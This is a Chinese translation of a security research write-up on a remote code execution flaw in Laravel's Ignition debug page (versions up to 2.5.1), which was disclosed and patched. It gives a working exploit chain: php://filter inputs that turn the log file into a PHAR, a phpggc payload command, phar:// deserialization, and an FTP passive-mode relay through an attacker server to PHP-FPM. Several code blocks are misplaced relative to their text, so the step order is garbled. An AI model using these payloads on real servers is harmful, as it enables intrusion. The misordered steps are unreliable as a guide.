> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ytyV5Q_q5OfuEiSMEbkfdg)

            2020 年 11 月底, 在为我们的一个客户进行安全审计时, 我们发现了一个基于 Laravel 的网站. 虽然这个网站的安全状态很好, 但我们注意到它是在调试模式下运行的, 因此显示了大量的错误信息, 包括堆栈痕迹:

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV0DMibZdYtRkibN9E7M48U2icHianvlWxTqAyjj9fPj11qZRp3r6tCbmKIjFdlbQ1fiagxzJqEHPuhWUfA/640?wx_fmt=png)

经过进一步的检查, 我们发现这些堆栈痕迹是由 Ignition 生成的, 而 Ignition 是 Laravel 第 6 版开始的默认错误页面生成器. 在穷尽了其他漏洞载体之后, 我们开始对这个包进行更精确的检查.

**Ignition <= 2.5.1**

            除了显示漂亮的堆栈痕迹, Ignition 还附带了解决方案, 小段的代码可以解决你在开发应用时可能遇到的问题. 例如，如果我们在模板中使用一个未知变量，会发生这样的情况：

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV0DMibZdYtRkibN9E7M48U2icHgbJmE7G2QniblXdobjPbrTdib7uXz3dicIPSCtJ9YIF6CtvXgvC9mAlcg/640?wx_fmt=png)

通过点击 "使变量可选"，我们模板中的 {{$username}} 会自动被{{ $username ? '' }}. 如果我们检查我们的 HTTP 日志，我们可以看到被调用的端点：

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV0DMibZdYtRkibN9E7M48U2icHb0OJnpQaNg3wB0DOwv6t4QEWlNFSrK07katuSRKw6BmXTbJoZqRnyA/640?wx_fmt=png)

除了解决方案的类名之外，我们还发送了一个文件路径和一个我们想要替换的变量名。这看起来很有趣。

让我们先检查一下类名向量：我们可以实例化任何东西吗？

```
class SolutionProviderRepository implements SolutionProviderRepositoryContract
{
    ...

    public function getSolutionForClass(string $solutionClass): ?Solution
{
        if (! class_exists($solutionClass)) {
            return null;
        }

        if (! in_array(Solution::class, class_implements($solutionClass))) {
            return null;
        }

        return app($solutionClass);
    }
}
```

不是：Ignition 会确保我们指向的类实现了 RunnableSolution。

那我们就来仔细看看这个类吧。负责这个的代码位于./vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php 中。也许我们可以改变一个任意文件的内容？

```
class MakeViewVariableOptionalSolution implements RunnableSolution
{
    ...

    public function run(array $parameters = [])
{
        $output = $this->makeOptional($parameters);
        if ($output !== false) {
            file_put_contents($parameters['viewFile'], $output);
        }
    }

    public function makeOptional(array $parameters = [])
{
        $originalContents = file_get_contents($parameters['viewFile']); // [1]
        $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName']." ?? ''", $originalContents);

        $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2]
        $newTokens = token_get_all(Blade::compileString($newContents));

        $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']);

        if ($expectedTokens !== $newTokens) { // [3]
            return false;
        }

        return $newContents;
    }

    protected function generateExpectedTokens(array $originalTokens, string $variableName): array
{
        $expectedTokens = [];
        foreach ($originalTokens as $token) {
            $expectedTokens[] = $token;
            if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) {
                $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]];
                $expectedTokens[] = [T_COALESCE, '??', $token[2]];
                $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]];
                $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, "''", $token[2]];
            }
        }

        return $expectedTokens;
    }

    ...
}
```

这段代码比我们预想的要复杂一些：读取给定的文件路径 [1] 后，将 $variableName 替换为 $variableName ? ''，初始文件和新文件都将被标记化[2]。如果我们的代码结构没有超出预期的变化，文件将被替换成新的内容。否则，makeOptional 将返回 false[3]，新文件将不会被写入。因此，我们无法使用 variableName 做太多事情。

唯一剩下的输入变量是 viewFile。如果我们对 variableName 和它的所有用途进行抽象，我们最终会得到下面的代码片段：

```
$contents = file_get_contents($parameters['viewFile']);
file_put_contents($parameters['viewFile'], $contents)
```

所以我们要把 viewFile 的内容写回 viewFile 中，不做任何修改。这什么都没有做!

我们拿出了两种解决方案，如果你想在阅读博文的其余部分之前自己尝试一下，下面是你如何设置实验室：

```
$ git clone https://github.com/laravel/laravel.git
$ cd laravel
$ git checkout e849812
$ composer install
$ composer require facade/ignition==2.5.1
$ php artisan serve
```

**日志文件到 PHAR**

**PHP 包装器：更改文件**

            现在，大家可能都听说过蔡橙子演示的上传进度技术。它利用 php://filter 来改变文件的内容，然后再返回。我们可以利用这一点，用我们的 exploitation primitive 来改造文件的内容：

```
$ echo test | base64 | base64 > /path/to/file.txt
$ cat /path/to/file.txt
ZEdWemRBbz0K
```

```
$f = 'php://filter/convert.base64-decode/resource=/path/to/file.txt';
# Reads /path/to/file.txt, base64-decodes it, returns the result
$contents = file_get_contents($f); 
# Base64-decodes $contents, then writes the result to /path/to/file.txt
file_put_contents($f, $contents);
```

```
$ cat /path/to/file.txt
test
```

            我们已经改变了文件的内容 ! 遗憾的是，这将会应用两次转换。阅读文档后，我们发现有一种方法可以只应用一次：

```
# To base64-decode once, use:
$f = 'php://filter/read=convert.base64-decode/resource=/path/to/file.txt';
# OR
$f = 'php://filter/write=convert.base64-decode/resource=/path/to/file.txt';
```

Badchars 甚至会被忽略

```
$ echo ':;.!!!!!ZEdWemRBbz0K:;.!!!!!' > /path/to/file.txt
```

```
$f = 'php://filter/read=convert.base64-decode|convert.base64-decode/resource=/path/to/file.txt';
$contents = file_get_contents($f); 
file_put_contents($f, $contents);
```

```
$ cat /path/to/file.txt
test
```

**编写日志文件**

            默认情况下，Laravel 的日志文件包含每一个 PHP 错误和堆栈跟踪，存储在存储 / log/laravel.log 中。让我们通过尝试加载一个不存在的文件来产生错误, SOME_TEXT_OF_OUR_CHOICE:

```
[2021-01-11 12:39:44] local.ERROR: file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory {"exception":"[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75)
[stacktrace]
#0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions->handleError()
#1 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents()
#2 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution->makeOptional()
#3 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution->run()
#4 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\Ignition\\Http\\Controllers\\ExecuteSolutionController->__invoke()
[...]
#32 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\Pipeline\\Pipeline->Illuminate\\Pipeline\\{closure}()
#33 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\\Pipeline\\Pipeline->then()
#34 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\Foundation\\Http\\Kernel->sendRequestThroughRouter()
#35 /work/pentest/laravel/laravel/public/index.php(52): Illuminate\\Foundation\\Http\\Kernel->handle()
#36 /work/pentest/laravel/laravel/server.php(21): require_once('/work/pentest/l...')
#37 {main}
"}
```

太棒了，我们可以在文件中注入（几乎）任意的内容。理论上，我们可以使用 Orange 的技术将日志文件转换为有效的 PHAR 文件，然后使用 phar:// 包装器来运行序列化的代码。遗憾的是，这行不通，原因有很多。

base64-decode 链显示了它的局限性

我们在前面说过，当 base64-decoding 一个字符串时，PHP 会忽略任何坏字符。这是正确的，除了一个字符：=。如果你使用 base64-decode 过滤一个中间包含一个 = 的字符串，PHP 将产生一个错误并不返回任何内容。

如果我们控制整个文件，这将是很好的。然而，我们注入到日志文件中的文本只是其中很小的一部分。有一个相当大的前缀（日期），还有一个巨大的后缀（堆栈跟踪）。此外，我们注入的文本出现了两次!

这是另一个恐怖的地方：

```
php > var_dump(base64_decode('[2022-04-30 23:59:11]'))。
string(0) ""
php > var_dump(base64_decode('[2022-04-12 23:59:11]'))。
string(1) "2"
```

根据日期的不同，两次解码前缀会产生一个不同大小的结果。当我们第三次解码时，在第二种情况下，我们的有效载荷将被前缀为 2，从而改变 base64 消息的对齐方式。

在我们可以使它工作的情况下，我们必须为每个目标建立一个新的有效载荷，因为堆栈跟踪包含绝对的文件名，而且每秒钟都要建立一个新的有效载荷，因为前缀包含时间。而且如果 a = 成功地进入了许多 base64-decodes 中的一个，我们仍然会被阻止。

因此，我们回到 PHP 文档中去寻找其他类型的过滤器。

输入编码

让我们回溯一下。日志文件中有这样的内容：

```
[previous log entries]
[prefix]PAYLOAD[midfix]PAYLOAD[suffix]
```

我们已经了解到，遗憾的是，垃圾邮件 base64-decode 可能会在某些时候失败。让我们利用这一点：如果我们发送垃圾邮件，就会发生一个解码错误，日志文件就会被清除! 我们造成的下一个错误将在日志文件中独立存在：

```
[prefix]PAYLOAD[midfix]PAYLOAD[suffix]
```

现在，我们又回到了最初的问题上：保留一个有效载荷并删除其余部分。幸运的是，php://filter 并不限于 base64 操作。例如，你可以用它来转换字符集。这里是 UTF-16 到 UTF-8 的转换：

```
echo -ne '[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0X[midfix]P\0A\0Y\0L\0O\0A\0D\0X[Some suffix ]' > /tmp/test.txt
```

```
php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt');
卛浯⁥牰晥硩崠PAYLOAD存業晤硩偝䄀夀䰀伀䄀䐀堀卛浯⁥畳晦硩崠
```

这真的很好：我们的有效载荷在那里，安全无恙，前缀和后缀变成了非 ASCII 字符。然而，在日志条目中，我们的有效载荷显示了两次，而不是一次。我们需要去掉第二个。

由于 UTF-16 是用两个字节工作的，所以我们可以通过在 payload 的末尾增加一个字节来错位第二个实例：

```
$ echo -n TEST! | base64 | sed -E 's/./\0\\0/g'
V\0E\0V\0T\0V\0C\0E\0=\0
$ echo -ne '[Some prefix ]V\0E\0V\0T\0V\0C\0E\0=\0X[midfix]V\0E\0V\0T\0V\0C\0E\0=\0X[Some suffix ]' > /tmp/test.txt
```

```
php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8|convert.base64-decode/resource=/tmp/test.txt');
TEST!
```

这样做的好处是，前缀的对齐方式不再重要：如果前缀大小均匀，第一个有效载荷将被正确解码。如果不是，第二个就会被正确解码。

我们现在可以将我们的发现与通常的 base64 解码结合起来，对任何我们想要的东西进行编码：

```
PHP Warning:  file_get_contents(): iconv stream filter ("utf16le"=>"utf-8"): invalid multibyte sequence in php shell code on line 1
```

```
[prefix]PAYLOAD_A[midfix]PAYLOAD_A[suffix]
[prefix]PAYLOAD_B[midfix]PAYLOAD_B[suffix]
```

说到对齐，如果日志文件本身不是 2 字节对齐的，转换过滤器会如何处理？

```
PHP Warning:  file_get_contents() expects parameter 1 to be a valid path, string given in php shell code on line 1
```

又是一个问题。我们可以很容易地通过两个有效载荷来解决这个问题：一个是无害的有效载荷 A，另一个是主动的有效载荷 B：

```
viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log
```

由于前缀、中缀和后缀都存在两次，还有 payload_a 和 payload_b，所以日志文件的大小必然是偶数，避免了错误的发生。

最后，我们还要解决最后一个问题：我们使用 NULL 字节将 payload 字节从一个垫到两个。在 PHP 中试图加载一个带有 NULL 字节的文件，结果会出现以下错误：

```
php -d'phar.readonly=0' ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E 's/./\0=00/g'
U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00
```

因此，我们将无法在错误日志中注入一个带有 NULL 字节的有效载荷。幸运的是，最后一个过滤器来拯救我们：convert.quoted-printable-decode。

我们可以使用 = 00 对 NULL 字节进行编码。

这是我们最后的转换链：

```
viewFile: php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/path/to/storage/logs/laravel.log
```

完整的开发步骤

创建一个 PHPGGC 有效载荷并对其进行编码：

```
viewFile: AA
```

清理日志（x10）

```
viewFile: U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00
```

创建第一个日志条目，用于对齐：

```
viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log
```

创建带有有效载荷的日志条目：

```
viewFile: phar:///path/to/storage/logs/laravel.log
```

应用我们的过滤器将日志文件转换为有效的 PHAR：

```
viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log
```

启动 PHAR 反序列化：

```
viewFile: phar:///path/to/storage/logs/laravel.log
```

Result:

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV0DMibZdYtRkibN9E7M48U2icHiaOagYZPKwISGyfmZ3oXmcgBBGOZ3icAB9FSEuIQtFcmINRc4iab7K14Q/640?wx_fmt=png)

As an exploit:

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV0DMibZdYtRkibN9E7M48U2icH9veUIUbOZT6D1IR5PMAXF5X4iaQficKqmZsS6NtDtFNtiarA4Nju5Jhlw/640?wx_fmt=png)

在确认了本地环境下的攻击后，我们继续在目标上进行测试，但没有成功。日志文件有一个不同的名字。在花了几个小时试图猜测它的名字后，我们猜不出来，于是只好实施另一种攻击。我们也许应该提前检查一下。

用 FTP 与 PHP-FPM 对话

由于我们可以运行 file_get_contents 来查找任何东西，我们可以通过发出 HTTP 请求来扫描常用端口。PHP-FPM 似乎在 9000 端口上监听。

众所周知，如果你能向 PHP-FPM 服务发送一个任意的二进制数据包，你就可以在机器上执行代码。这种技术经常与 gopher:// 协议结合使用，curl 支持 gopher:// 协议，但 PHP 不支持。

另一个已知的允许你通过 TCP 发送二进制数据包的协议是 FTP，更准确的说是它的被动模式：如果一个客户端试图从 FTP 服务器上读取一个文件（或写到），服务器可以告诉客户端将文件的内容读取（或写）到一个特定的 IP 和端口上。这些 IP 和端口可以是什么，没有限制。例如，服务器可以告诉客户机连接到自己的一个端口，如果它愿意的话。

现在，如果我们尝试使用 viewFile=ftp://evil-server.lexfo.fr/file.txt 来利用这个漏洞，会发生以下情况。

file_get_contents() 连接到我们的 FTP 服务器，并下载 file.txt。

file_put_contents() 连接到我们的 FTP 服务器，并将其上传到 file.txt。

你可能知道这是怎么回事：我们将使用 FTP 协议的被动模式使 file_get_contents() 在我们的服务器上下载一个文件，当它试图使用 file_put_contents() 把它上传回来时，我们将告诉它把文件发送到 127.0.0.1:9000。

这样我们就可以向 PHP-FPM 发送一个任意数据包，从而执行代码。

这一次，在我们的目标上成功地进行了利用。

我们在 2020 年 11 月 16 日在 GitHub 上向 Ignition 的维护者报告了这个 bug 以及一个补丁，第二天就发布了一个新的版本（2.5.2）。由于它是 Laravel 的一个 require-dev 依赖，我们希望在这个日期之后安装的每个实例都是安全的。

参考文献：

https://www.ambionics.io/blog/laravel-debug-rce